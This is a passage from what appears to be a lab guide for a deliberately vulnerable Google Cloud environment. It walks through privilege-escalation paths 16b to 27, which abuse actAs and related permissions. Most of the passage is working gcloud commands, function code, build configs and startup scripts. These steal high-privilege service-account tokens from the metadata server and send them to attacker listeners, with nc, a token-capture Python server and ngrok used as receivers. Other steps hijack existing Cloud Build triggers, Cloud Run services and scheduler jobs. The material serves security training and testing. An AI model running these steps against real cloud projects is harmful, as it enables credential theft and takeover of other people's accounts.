# Step 4: SSH to the VM and extract the SA token
gcloud compute ssh privesc16b-vm --zone=us-central1-a

# From inside the VM:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud compute instances delete privesc16b-vm --zone=us-central1-a --quiet
gcloud compute instance-templates delete privesc16b-template --quiet
```

---

#### Path 16c: Instance Templates + Managed Instance Group (MIG)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc16c-inst-templ@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `compute.instanceTemplates.create` + `compute.instanceGroupManagers.create` |
| **Supporting Permissions** | `compute.networks.get`, `compute.subnetworks.get`, `compute.instances.create`, `compute.instances.setServiceAccount`, `compute.disks.create` |
| **Target** | Create template and MIG that auto-spawns VMs with high-priv SA |
| **Impact** | Critical - MIG spawns VMs with high-priv SA, can scale to multiple instances |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc16c-inst-templ@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create an instance template with high-priv SA
gcloud compute instance-templates create privesc16c-template \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --machine-type=e2-micro

# Step 3: Create a managed instance group using the template
gcloud compute instance-groups managed create privesc16c-mig \
  --template=privesc16c-template \
  --size=1 \
  --zone=us-central1-a

# Step 4: List instances in the MIG
gcloud compute instance-groups managed list-instances privesc16c-mig \
  --zone=us-central1-a
```

> **Note:** Once the MIG creates instances, use the `privesc-instance-connect` SA (or paths 11a-14) to complete the exploit.

| **Completion Permissions** | `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`, `compute.instances.setMetadata`, `iam.serviceAccounts.actAs` (on VM's SA) |
|----------------------------|------------------------------------------------------------------------------------------------------------------------------------------|

> **Important:** `gcloud compute ssh` requires `iam.serviceAccounts.actAs` on the VM's attached service
> account. The `privesc-instance-connect` SA has this on the high-priv SA.

```bash
# Impersonate the instance-connect SA (has completion permissions + actAs on high-priv SA)
gcloud config set auth/impersonate_service_account \
  privesc-instance-connect@$PROJECT_ID.iam.gserviceaccount.com

# Step 5: SSH to one of the MIG instances and get token
gcloud compute ssh <INSTANCE_NAME> --zone=us-central1-a

curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud compute instance-groups managed delete privesc16c-mig --zone=us-central1-a --quiet
gcloud compute instance-templates delete privesc16c-template --quiet
```

---

## Cloud Functions (Paths 17-18)

> **Note:** Cloud Functions Gen1 runtimes have been decommissioned. All examples below use Gen2 functions
> which run on Cloud Run under the hood. The `--gen2` flag is now the default for `gcloud functions deploy`.

### Path 17: actAs + Cloud Functions Create

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc17-actas-function@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `cloudfunctions.functions.create` |
| **Supporting Permissions** | `cloudfunctions.functions.get`, `cloudfunctions.functions.generateUploadUrl`, `cloudfunctions.operations.get`, `run.services.getIamPolicy`, `run.services.setIamPolicy` |
| **Target** | New function with high-priv SA |
| **Impact** | Execute code as high-priv SA |

> **Note:** Cloud Functions Gen2 uses Cloud Build and Cloud Run. This requires `actAs` on both
> the target high-priv SA and the default Compute SA (for Cloud Build).

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc17-actas-function@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create function source
mkdir -p /tmp/privesc17-function && cd /tmp/privesc17-function
cat > index.js << 'EOF'
const {google} = require('googleapis');
exports.handler = async (req, res) => {
  const auth = new google.auth.GoogleAuth({scopes: ['https://www.googleapis.com/auth/cloud-platform']});
  const token = await auth.getAccessToken();
  res.send(`Token: ${token}`);
};
EOF

cat > package.json << 'EOF'
{"dependencies": {"googleapis": "^100.0.0"}}
EOF

# Step 3: Deploy the function (Gen2)
gcloud functions deploy privesc17-function \
  --gen2 \
  --runtime=nodejs22 \
  --trigger-http \
  --allow-unauthenticated \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --region=us-central1 \
  --entry-point=handler

# Step 4: Invoke to get the high-priv SA token
curl $(gcloud functions describe privesc17-function --region=us-central1 --gen2 --format='value(serviceConfig.uri)')

# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud functions delete privesc17-function --region=us-central1 --gen2 --quiet
```

---

### Path 18: Update Cloud Function Code

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc18-update-function@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `cloudfunctions.functions.update` + `iam.serviceAccounts.actAs` |
| **Supporting Permissions** | `cloudfunctions.functions.get`, `cloudfunctions.functions.generateUploadUrl`, `cloudfunctions.operations.get` |
| **Target** | Existing function with high-priv SA |
| **Impact** | Inject code that runs as high-priv SA |
| **Requires** | `enable_privesc18 = true` |

> **Note:** GCP requires `actAs` on the function's runtime SA even for code-only updates.
> This requires `actAs` on both the high-priv SA and the default Compute SA (for Cloud Build).

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc18-update-function@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create malicious function code
mkdir -p /tmp/privesc18-code && cd /tmp/privesc18-code
cat > index.js << 'EOF'
const {google} = require('googleapis');
exports.handler = async (req, res) => {
  const auth = new google.auth.GoogleAuth({scopes: ['https://www.googleapis.com/auth/cloud-platform']});
  const token = await auth.getAccessToken();
  res.send(`Stolen token: ${token}`);
};
EOF
cat > package.json << 'EOF'
{"dependencies": {"googleapis": "^100.0.0"}}
EOF

# Step 3: Update the existing function with malicious code
gcloud functions deploy privesc-function \
  --gen2 \
  --source=/tmp/privesc18-code \
  --runtime=nodejs22 \
  --entry-point=handler \
  --region=us-central1

# Step 4: Invoke the modified function
curl $(gcloud functions describe privesc-function --region=us-central1 --gen2 --format='value(serviceConfig.uri)')
```

---

## Cloud Run (Paths 19-22)

> **Infrastructure Requirements:** Paths 19-22 share infrastructure including:
> - Token-extractor container image (auto-built via Cloud Build)
> - Target Cloud Run service running as high-priv SA
> - Artifact Registry repository for images
>
> **Cost:** < $0.10/month total (Cloud Build, Artifact Registry, and Cloud Run all have generous free tiers)
>
> Enable with: `enable_privesc19 = true`, `enable_privesc20 = true`, or `enable_privesc21 = true`

### Path 19: actAs + Cloud Run Services Create

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc19-actas-cloudrun@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `run.services.create` |
| **Supporting Permissions** | `run.services.get`, `run.operations.get` |
| **Target** | New Cloud Run service with high-priv SA |
| **Impact** | Execute containers as high-priv SA |
| **Requires** | `enable_privesc19 = true` |

```bash
# Step 1: Start a listener on your machine to receive the exfiltrated token
nc -lnvp 8080

# Step 2: In another terminal, impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc19-actas-cloudrun@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Deploy the token-extractor image with the high-priv SA
# Set EXFIL_URL to your listener - the container POSTs token on startup (and every 30 min)
TOKEN_EXTRACTOR="us-central1-docker.pkg.dev/$PROJECT_ID/privesc-images/token-extractor:latest"

gcloud run deploy privesc19-service \
  --image=$TOKEN_EXTRACTOR \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --region=us-central1 \
  --set-env-vars="EXFIL_URL=http://YOUR_IP:8080"

# Step 4: Check your nc listener - you should receive:
# {"email": "privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com", "token": {"access_token":"ya29.c.c0ASRK...","expires_in":3599,"token_type":"Bearer"}}


# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud run services delete privesc19-service --region=us-central1 --quiet
```

---

### Path 20: Cloud Run Services Update

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc20-run-update@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `run.services.update` + `iam.serviceAccounts.actAs` |
| **Supporting Permissions** | `run.services.get`, `run.operations.get`, `run.revisions.get` |
| **Target** | Existing Cloud Run service (`privesc20-run-service`) with high-priv SA |
| **Impact** | Update service to exfiltrate high-priv SA token |
| **Requires** | `enable_privesc20 = true` |

> **Note:** The target service (`privesc20-run-service`) is pre-deployed with the token-extractor
> image running as the high-priv SA. Update the service to set `EXFIL_URL` and trigger token
> exfiltration to your listener.

```bash
# Step 1: Start a listener on your machine
nc -lnvp 8080

# Step 2: In another terminal, impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc20-run-update@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Update the existing service with token-extractor image and exfil URL
TOKEN_EXTRACTOR="us-central1-docker.pkg.dev/$PROJECT_ID/privesc-images/token-extractor:latest"

gcloud run services update privesc20-run-service \
  --image=$TOKEN_EXTRACTOR \
  --region=us-central1 \
  --set-env-vars="EXFIL_URL=http://YOUR_IP:8080"

# Step 4: Check your nc listener for the exfiltrated token
# {"email": "privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com", "token": {"access_token":"ya29.c.c0ASRK..."}}

# Cleanup
gcloud config unset auth/impersonate_service_account
```

---

### Path 21: Cloud Run Jobs Create

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc21-run-jobs@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `run.jobs.create` |
| **Supporting Permissions** | `run.jobs.get`, `run.jobs.run`, `run.executions.get` |
| **Target** | Cloud Run job with high-priv SA |
| **Impact** | Execute containers as high-priv SA |
| **Requires** | `enable_privesc21 = true` |

> **Note:** Cloud Run Jobs are ideal for token extraction since they run once and exit.
> The token-extractor image POSTs the token to your listener on startup.

```bash
# Step 1: Start a listener on your machine
nc -lnvp 8080

# Step 2: In another terminal, impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc21-run-jobs@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Create a Cloud Run job with exfiltration enabled
TOKEN_EXTRACTOR="us-central1-docker.pkg.dev/$PROJECT_ID/privesc-images/token-extractor:latest"

gcloud run jobs create privesc21-job \
  --image=$TOKEN_EXTRACTOR \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --region=us-central1 \
  --set-env-vars="EXFIL_URL=http://YOUR_IP:8080"

# Step 4: Execute the job
gcloud run jobs execute privesc21-job --region=us-central1

# Step 5: Check your nc listener for the exfiltrated token
# {"email": "privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com", "token": {"access_token":"ya29.c.c0ASRK..."}}

# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud run jobs delete privesc21-job --region=us-central1 --quiet
```

---

### Path 22: Cloud Run Jobs Update

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc22-run-jobs-update@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `run.jobs.update` + `iam.serviceAccounts.actAs` |
| **Supporting Permissions** | `run.jobs.get`, `run.jobs.run`, `run.executions.get` |
| **Target** | Existing Cloud Run job (`privesc22-run-job`) with high-priv SA |
| **Impact** | Update job to exfiltrate high-priv SA token |
| **Requires** | `enable_privesc22 = true` |

> **Note:** The target job (`privesc22-run-job`) is pre-deployed with the token-extractor
> image running as the high-priv SA. Update the job to set `EXFIL_URL` and execute it.

```bash
# Step 1: Start a listener on your machine
nc -lnvp 8080

# Step 2: In another terminal, impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc22-run-jobs-update@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Update the existing job with token-extractor image and exfil URL
TOKEN_EXTRACTOR="us-central1-docker.pkg.dev/$PROJECT_ID/privesc-images/token-extractor:latest"

gcloud run jobs update privesc22-run-job \
  --image=$TOKEN_EXTRACTOR \
  --region=us-central1 \
  --set-env-vars="EXFIL_URL=http://YOUR_IP:8080"

# Step 4: Execute the job
gcloud run jobs execute privesc22-run-job --region=us-central1

# Step 5: Check your nc listener for the exfiltrated token
# {"email": "privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com", "token": {"access_token":"ya29.c.c0ASRK..."}}

# Cleanup
gcloud config unset auth/impersonate_service_account
```

---

## Cloud Build (Paths 23a, 23b, 24)

### Path 23a: actAs + Cloud Build Create (Direct)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc23a-actas-cloudbuild@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `cloudbuild.builds.create` |
| **Supporting Permissions** | `cloudbuild.builds.get` |
| **Target** | Build running as high-priv SA |
| **Impact** | Execute build steps as high-priv SA |

```bash
# Step 1: Start a listener on your machine
nc -lnvp 8080

# Step 2: In another terminal, set your exfil URL and impersonate the vulnerable SA
EXFIL_URL="http://YOUR_IP:8080"

gcloud config set auth/impersonate_service_account \
  privesc23a-actas-cloudbuild@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Create a build config that exfiltrates credentials to your listener
cat > /tmp/privesc23a-cloudbuild.yaml << EOF
steps:
- name: 'gcr.io/cloud-builders/curl'
  entrypoint: 'bash'
  args:
  - '-c'
  - |
    email=\$\$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email)
    token=\$\$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)
    curl -X POST -d "{\\"email\\":\\"\$\$email\\",\\"token\\":\$\$token}" $EXFIL_URL
options:
  logging: NONE
EOF

# Step 4: Submit the build with the high-priv SA
gcloud builds submit --no-source \
  --config=/tmp/privesc23a-cloudbuild.yaml \
  --service-account=projects/$PROJECT_ID/serviceAccounts/privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --suppress-logs

# Step 5: Check your nc listener for the exfiltrated token
# {"email": "privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com", "token": {"access_token":"ya29.c.c0ASRK..."}}

# Cleanup
gcloud config unset auth/impersonate_service_account
rm /tmp/privesc23a-cloudbuild.yaml
```

---

### Path 23b: Cloud Build Triggers (Persistent)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc23b-triggers@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `cloudbuild.builds.create` |
| **Supporting Permissions** | `cloudbuild.builds.get`, `cloudbuild.builds.list` |
| **Target** | Cloud Build trigger with high-priv SA |
| **Impact** | Persistent build execution on repo events |

> **Note:** This path requires a connected repository (GitHub, GitLab, or Cloud Source Repositories).
> The trigger creates persistent access - any push to the repo executes builds as the high-priv SA.

#### Prerequisites: Connect GitHub Repository

Before exploiting this path, you must connect a GitHub repository to Cloud Build. This is a one-time manual setup:

1. **Visit the Cloud Build Repository Connection page:**
   ```
   https://console.cloud.google.com/cloud-build/triggers;region=global/connect?project=YOUR_PROJECT_ID
   ```

2. **Connect your GitHub account:**
   - Click "Connect Repository"
   - Select "GitHub" as the source
   - Authenticate with GitHub and authorize Cloud Build
   - Select the repository you want to use (or create a new one)
   - Click "Connect"

3. **Verify the connection:**
   ```bash
   gcloud builds repositories list --region=global
   ```

```bash
# Step 1: Start a listener on your machine (in a separate terminal)
nc -lnvp 8080

# Step 2: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc23b-triggers@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Create the build config file and push to your repository
# Create privesc23b-cloudbuild.yaml in your connected GitHub repo with this content:
cat > privesc23b-cloudbuild.yaml << 'EOF'
steps:
- name: 'gcr.io/cloud-builders/curl'
  entrypoint: 'bash'
  args:
  - '-c'
  - |
    email=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email)
    token=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)
    echo "Running as: $email"
    echo "Token: $token"
    curl -X POST -d "{\"email\":\"$email\",\"token\":$token}" $_EXFIL_URL
options:
  logging: CLOUD_LOGGING_ONLY
EOF
# Push this file to your GitHub repository

# Step 4: Create a build trigger linked to your repository
# Replace YOUR_REPO_OWNER and YOUR_REPO_NAME with your GitHub repo
gcloud builds triggers create github \
  --name=privesc23b-trigger \
  --repo-name=YOUR_REPO_NAME \
  --repo-owner=YOUR_REPO_OWNER \
  --branch-pattern=".*" \
  --build-config=privesc23b-cloudbuild.yaml \
  --service-account=projects/$PROJECT_ID/serviceAccounts/privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 5: Trigger the build manually (or push to the repo)
# Option A: Run the trigger manually
gcloud builds triggers run privesc23b-trigger \
  --branch=main \
  --substitutions=_EXFIL_URL="http://YOUR_IP:8080"

# Option B: Push to the repository to trigger automatically
# Any push will now execute as the high-priv SA

# Step 6: Check your listener for the exfiltrated token
# You should receive: {"email":"privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com","token":{"access_token":"ya29..."}}

# Cleanup
# gcloud builds triggers delete privesc23b-trigger --quiet
gcloud config unset auth/impersonate_service_account
```

---

### Path 24: Cloud Build Trigger Update (Hijack 23b)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Prerequisite** | **Path 23b must be completed first** (creates the target trigger) |
| **Starting SA** | `privesc24-builds-update@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` (on both old and new SA) + `roles/cloudbuild.builds.editor` |
| **Supporting Permissions** | `cloudbuild.builds.get`, `cloudbuild.builds.list`, `serviceusage.services.use` |
| **Target SA** | `privesc24-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com` (Owner role) |
| **Target** | Existing Cloud Build trigger (`privesc23b-trigger` from Path 23b) |
| **Impact** | Hijack CI/CD pipeline and swap SA to exfiltrate different high-priv token |

> **Note:** This path demonstrates hijacking an existing trigger created by Path 23b
> and swapping its service account to a different high-priv SA. Complete Path 23b first
> to create the `privesc23b-trigger`, then use this path to update the trigger's SA
> from `privesc-high-priv-sa` to `privesc24-high-priv-sa`.
>
> **Important:** To update a trigger and change its service account, you need `iam.serviceAccounts.actAs`
> on **both** the currently configured SA (`privesc-high-priv-sa`) and the new SA (`privesc24-high-priv-sa`).

```bash
# Step 1: Start a listener on your machine (in a separate terminal)
nc -lnvp 8080

# Step 2: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc24-builds-update@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: List existing triggers to find the target (created by 23b)
gcloud builds triggers list
# Should show: privesc23b-trigger

# Step 4: Export the trigger configuration
gcloud builds triggers describe privesc23b-trigger --format=yaml > /tmp/privesc24-trigger.yaml

# Step 5: Create modified trigger - swap SA to privesc24-high-priv-sa and inject malicious steps
# Note: Update the github section to match the repo from 23b
cat > /tmp/privesc24-trigger-modified.yaml << EOF
name: privesc23b-trigger
serviceAccount: projects/$PROJECT_ID/serviceAccounts/privesc24-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
github:
  owner: YOUR_REPO_OWNER
  name: YOUR_REPO_NAME
  push:
    branch: .*
build:
  steps:
  - name: 'gcr.io/cloud-builders/curl'
    entrypoint: 'bash'
    args:
    - '-c'
    - |
      email=\$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email)
      token=\$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)
      curl -X POST -d "{\"email\":\"\$email\",\"token\":\$token}" \$_EXFIL_URL
  options:
    logging: CLOUD_LOGGING_ONLY
EOF

# Step 6: Import the modified trigger (hijacks and swaps SA)
gcloud builds triggers import --source=/tmp/privesc24-trigger-modified.yaml

# Step 7: Verify the SA was swapped
gcloud builds triggers describe privesc23b-trigger --format="value(serviceAccount)"
# Should now show: projects/PROJECT_ID/serviceAccounts/privesc24-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com

# Step 8: Run the hijacked trigger
gcloud builds triggers run privesc23b-trigger \
  --branch=main \
  --substitutions=_EXFIL_URL="http://YOUR_IP:8080"

# Step 9: Check your listener for the exfiltrated token
# You should receive: {"email":"privesc24-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com","token":{"access_token":"ya29..."}}
# Note: The email shows privesc24-high-priv-sa, proving the SA swap worked!

# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud builds triggers delete privesc23b-trigger --quiet

rm /tmp/privesc24-trigger.yaml /tmp/privesc24-trigger-modified.yaml
```

---

## Cloud Scheduler (Paths 25, 26)

**Setup for Cloud Scheduler Paths**
> **SSL Requirement**: Cloud Scheduler requires a valid SSL certificate from a trusted CA.
> Self-signed certificates will NOT work. Use ngrok, Cloudflare tunnel, or Let's Encrypt.

***Option A: Using ngrok (easiest for testing)***

```bash
# Terminal 1: Start ngrok to get a valid HTTPS URL
ngrok http 8443

# Note the https://xxxx.ngrok.io URL provided

# Terminal 2: Start netcat listener with SSL (using ncat from nmap)
# Generate a self-signed cert (ngrok terminates SSL, so this is just for local)
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem \
  -days 1 -nodes -subj "/CN=localhost"

# Listen with ncat (handles HTTP properly)
ncat -lvnp 8443 --ssl --ssl-cert /tmp/cert.pem --ssl-key /tmp/key.pem

# Or simpler - just use plain netcat since ngrok handles SSL:
nc -lvnp 8443
```

***Option B: Using a simple Python HTTPS server***

```bash
# Terminal 1: Create a simple token receiver
cat > /tmp/token_server.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class TokenHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        auth_header = self.headers.get('Authorization', 'No Auth Header')
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8')

        print("\n" + "="*60)
        print("CAPTURED OIDC TOKEN:")
        print("="*60)
        print(f"Authorization: {auth_header}")
        print(f"Body: {body}")
        print("="*60 + "\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Token captured')

httpd = HTTPServer(('0.0.0.0', 8443), TokenHandler)
httpd.socket = ssl.wrap_socket(httpd.socket,
    certfile='/tmp/cert.pem', keyfile='/tmp/key.pem', server_side=True)
print("Listening on https://0.0.0.0:8443")
httpd.serve_forever()
EOF

# Generate cert and run (use with ngrok for valid SSL)
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem \
  -days 1 -nodes -subj "/CN=localhost"
python3 /tmp/token_server.py
```


### Path 25: Cloud Scheduler Create

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc25-scheduler@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `cloudscheduler.jobs.create` |
| **Target** | Scheduled job with high-priv SA |
| **Impact** | Steal OIDC identity token of high-priv SA |


```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc25-scheduler@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a scheduler job (replace YOUR_NGROK_URL)
export EXFIL_URL="https://xxxx.ngrok.io"

gcloud scheduler jobs create http privesc25-scheduler \
  --schedule="*/5 * * * *" \
  --uri="$EXFIL_URL/capture" \
  --http-method=POST \
  --oidc-service-account-email=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --oidc-token-audience="$EXFIL_URL" \
  --location=us-central1 \
  --message-body='{"source":"scheduler"}'

# Step 3: Manually trigger the job immediately (don't wait for schedule)
gcloud scheduler jobs run privesc25-exfil --location=us-central1

# The OIDC token will be sent in the Authorization header as "Bearer <token>"
# You can decode the JWT at jwt.io or use it directly for API calls


# Cleanup
gcloud scheduler jobs delete privesc25-exfil --location=us-central1 --quiet
gcloud config unset auth/impersonate_service_account
```

---

### Path 26: Cloud Scheduler Update (Hijack Existing Job)

| Property | Value |
|----------|-------|
| Status | **Disabled by Default** (requires existing scheduler job) |
| **Starting SA** | `privesc26-scheduler-update@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `cloudscheduler.jobs.update` |
| **Target** | Modify existing scheduled job to use high-priv SA |
| **Impact** | Hijack existing jobs to steal tokens |
| **Target Job** | `terraform output privesc26_target_job_name` |

> **Enable with:** `enable_privesc26 = true` in terraform.tfvars
> Terraform creates a target scheduler job for you to hijack.

If you have `cloudscheduler.jobs.update` (but NOT create), you can modify an existing
scheduler job to point to your exfiltration endpoint and use a different service account:

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc26-scheduler-update@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Get the target job created by terraform
export TARGET_JOB=$(terraform output -raw privesc26_target_job_name)
# Or list all scheduler jobs:
gcloud scheduler jobs list --location=us-central1

# Step 3: Update the target job to exfiltrate the high-priv SA token
export EXFIL_URL="https://xxxx.ngrok.io"

gcloud scheduler jobs update http $TARGET_JOB \
  --location=us-central1 \
  --uri="$EXFIL_URL/capture" \
  --http-method=POST \
  --oidc-service-account-email=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --oidc-token-audience="$EXFIL_URL"

# Step 4: Trigger the modified job
gcloud scheduler jobs run $TARGET_JOB --location=us-central1

# Cleanup - restore original job configuration or delete
gcloud config unset auth/impersonate_service_account
```

---

## Deployment Manager (Path 27)

> **DEPRECATION NOTICE:** Cloud Deployment Manager will reach end of support on March 31, 2026.
> Google recommends migrating to Terraform or Infrastructure Manager.

### Path 27: Deployment Manager

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc27-deployment-manager@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `deploymentmanager.deployments.create` |
| **Supporting Permissions** | `deploymentmanager.deployments.get`, `deploymentmanager.operations.get`, `deploymentmanager.manifests.get` |
| **Target** | Deploy resources with high-priv SA attached |
| **Impact** | Token theft via deployed resource |

The `actAs` permission allows attaching the high-priv SA to any deployed resource. Choose the approach that fits your environment:

#### Option A: Compute Instance with Startup Script (Recommended)

Deploy a VM that exfiltrates its token on boot - no SSH or bucket required:

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc27-deployment-manager@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create deployment config with startup script
export EXFIL_URL="https://xxxx.ngrok.io"
cat > /tmp/privesc27a-deployment.yaml << EOF
resources:
- name: privesc27a-vm
  type: compute.v1.instance
  properties:
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/e2-micro
    disks:
    - deviceName: boot
      type: PERSISTENT
      boot: true
      autoDelete: true
      initializeParams:
        sourceImage: projects/debian-cloud/global/images/family/debian-11
    networkInterfaces:
    - network: global/networks/default
      accessConfigs:
      - name: External NAT
        type: ONE_TO_ONE_NAT
    serviceAccounts:
    - email: privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
      scopes:
      - https://www.googleapis.com/auth/cloud-platform
    metadata:
      items:
      - key: startup-script
        value: |
          #!/bin/bash
          TOKEN=\$(curl -s -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
          curl -X POST -H "Content-Type: application/json" -d "\$TOKEN" $EXFIL_URL/token
EOF

# Step 3: Deploy (token will be posted on VM startup)
gcloud deployment-manager deployments create privesc27a-deployment \
  --config=/tmp/privesc27a-deployment.yaml

# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud deployment-manager deployments delete privesc27a-deployment --quiet
```

#### Option B: Compute Instance with SSH Access

If you have SSH access configured:

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc27-deployment-manager@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create deployment config
cat > /tmp/privesc27b-deployment.yaml << EOF
resources:
- name: privesc27b-vm
  type: compute.v1.instance
  properties:
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/e2-micro
    disks:
    - deviceName: boot
      type: PERSISTENT
      boot: true
      autoDelete: true
      initializeParams:
        sourceImage: projects/debian-cloud/global/images/family/debian-11
    networkInterfaces:
    - network: global/networks/default
      accessConfigs:
      - name: External NAT
        type: ONE_TO_ONE_NAT
    serviceAccounts:
    - email: privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
      scopes:
      - https://www.googleapis.com/auth/cloud-platform
EOF

# Step 3: Deploy
gcloud deployment-manager deployments create privesc27b-deployment \
  --config=/tmp/privesc27b-deployment.yaml

# Step 4: SSH and get token
gcloud compute ssh privesc27b-vm --zone=us-central1-a
# On the VM:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud deployment-manager deployments delete privesc27b-deployment --quiet
```

#### Option C: Update Existing Deployment (Testing - May Become Separate Path)

If you have `deploymentmanager.deployments.update` but NOT create, you may be able to hijack an existing deployment by adding a new resource with the high-priv SA:

```bash
